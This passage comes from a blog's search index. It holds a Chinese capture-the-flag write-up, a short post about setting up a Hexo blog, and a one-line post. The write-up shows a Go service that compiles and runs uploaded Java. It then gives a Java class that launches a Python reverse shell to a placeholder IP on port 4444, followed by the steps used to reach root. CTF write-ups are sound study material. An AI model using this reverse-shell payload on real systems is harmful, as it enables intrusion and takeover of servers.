http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 保存上传的文件至./upload文件夹</span><br><span class="line">    err = saveFile(file, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error saving file&quot;, http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 生成随机文件名</span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    randomName := strconv.FormatInt(rand.Int63(), 16) + &quot;.jar&quot;</span><br><span class="line"> </span><br><span class="line">    // 编译Java文件</span><br><span class="line">    cmd := &quot;javac ./upload/&quot; + handler.Filename</span><br><span class="line">    compileCmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, cmd)</span><br><span class="line">    //compileCmd := exec.Command(&quot;javac&quot;, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">    compileOutput, err := compileCmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error compiling Java file: &quot;+string(compileOutput), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 将编译后的.class文件打包成.jar文件</span><br><span class="line">    fileNameWithoutExtension := strings.TrimSuffix(handler.Filename, filepath.Ext(handler.Filename))</span><br><span class="line">    jarCmd := exec.Command(&quot;jar&quot;, &quot;cvfe&quot;, &quot;./final/&quot;+randomName, fileNameWithoutExtension, &quot;-C&quot;, &quot;./upload&quot;, strings.TrimSuffix(handler.Filename, &quot;.java&quot;)+&quot;.class&quot;)</span><br><span class="line">    jarOutput, err := jarCmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error creating JAR file: &quot;+string(jarOutput), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 返回编译后的.jar文件的下载链接</span><br><span class="line">    fmt.Fprintf(w, &quot;/final/%s&quot;, randomName)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// saveFile 保存上传的文件</span><br><span class="line">func saveFile(file multipart.File, filePath string) error &#123;</span><br><span class="line">    // 创建目标文件</span><br><span class="line">    f, err := os.Create(filePath)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        return err</span><br><span class="line">    &#125;</span><br><span class="line">    defer f.Close()</span><br><span class="line"> </span><br><span class="line">    // 将上传的文件内容复制到目标文件中</span><br><span class="line">    _, err = io.Copy(f, file)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        return err</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return nil</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func testExecYourJarOnServer(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    jarFile := &quot;./final/&quot; + r.URL.Query().Get(&quot;jar&quot;)</span><br><span class="line"> </span><br><span class="line">    // 检查是否存在指定的.jar文件</span><br><span class="line">    if !strings.HasSuffix(jarFile, &quot;.jar&quot;) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid jar file format&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if _, err := os.Stat(jarFile); os.IsNotExist(err) &#123;</span><br><span class="line">        http.Error(w, &quot;Jar file not found&quot;, http.StatusNotFound)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 执行.jar文件</span><br><span class="line">    cmd := exec.Command(&quot;java&quot;, &quot;-jar&quot;, jarFile)</span><br><span class="line">    output, err := cmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error running jar file: &quot;+string(output), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 输出结果</span><br><span class="line">    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain&quot;)</span><br><span class="line">    w.Write(output)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> 可以发现有一个接口testExecYourJarOnServer用于在服务器上运行jar文件，可以构造java代码</span><br><span class="line"># ExecuteSystemCommand.java</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class ExecuteSystemCommand &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String[] cmd = &#123; &quot;python3&quot;, &quot;-c&quot;,</span><br><span class="line">                &quot;import os,pty,socket;s=socket.socket();s.connect((\&quot;[IP]\&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;bash\&quot;)&quot; &#125;;</span><br><span class="line"></span><br><span class="line">        ProcessBuilder processBuilder = new ProcessBuilder(cmd);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Process process = processBuilder.start();</span><br><span class="line"></span><br><span class="line">            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            int exitCode = process.waitFor();</span><br><span class="line">            System.out.println(&quot;Exited with code: &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;访问接口</span><br><span class="line">http://hnctf.imxbt.cn:27984/testExecYourJarOnServer?jar=429e7d2610c50acb.jar成功拿到shell</span><br><span class="line">在根目录可以找到/memorandum文件，翻译是备忘录</span><br><span class="line">cat /memorandum        </span><br><span class="line">AsdDABG</span><br><span class="line">猜测是密码，尝试登录</span><br><span class="line">su</span><br><span class="line">Password  AsdDABG</span><br><span class="line">登录成功，拿flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Start</title>
      <link href="/2024/05/19/Start/"/>
      <url>/2024/05/19/Start/</url>
      
        <content type="html"><![CDATA[<p>来由：昨天在学习的时候，意外看到了好多厉害的师傅们都有一个自己的博客，来记录自己的生活以及学习笔记等等，虽然我之前也一直想做这件事情但始终没有行动，那既然又遇到了，那就开始搭建一个属于自己的博客吧，开创一个属于自己的小窝，欸嘿!</p><p>搭建博客过程中遇到的几个小问题:<br>1.之前已经装过nodejs了，不知道路径，这样可以查到具体路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows查询:</span><br><span class="line">where node</span><br><span class="line">where npm</span><br><span class="line">Bash查询:</span><br><span class="line">which node</span><br><span class="line">which npm</span><br></pre></td></tr></table></figure><p>2.输入 npm install -g hexo-cli的时候，需要以管理员身份运行</p><p>毕竟每个人遇到的问题都可能不太一样，到时候，希望大家耐心搭建，一定坚持下去呀。</p><p>参考博客：<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p><p><a href="https://blog.csdn.net/ItDaChuang/article/details/111261426">https://blog.csdn.net/ItDaChuang/article/details/111261426</a></p><p>今后就正式开始以博客的形式来记录啦，希望能够看到自己的成长吧。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>paper</title>
      <link href="/2024/05/19/paper/"/>
      <url>/2024/05/19/paper/</url>
      
        <content type="html"><![CDATA[<p>Fighting!!1</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
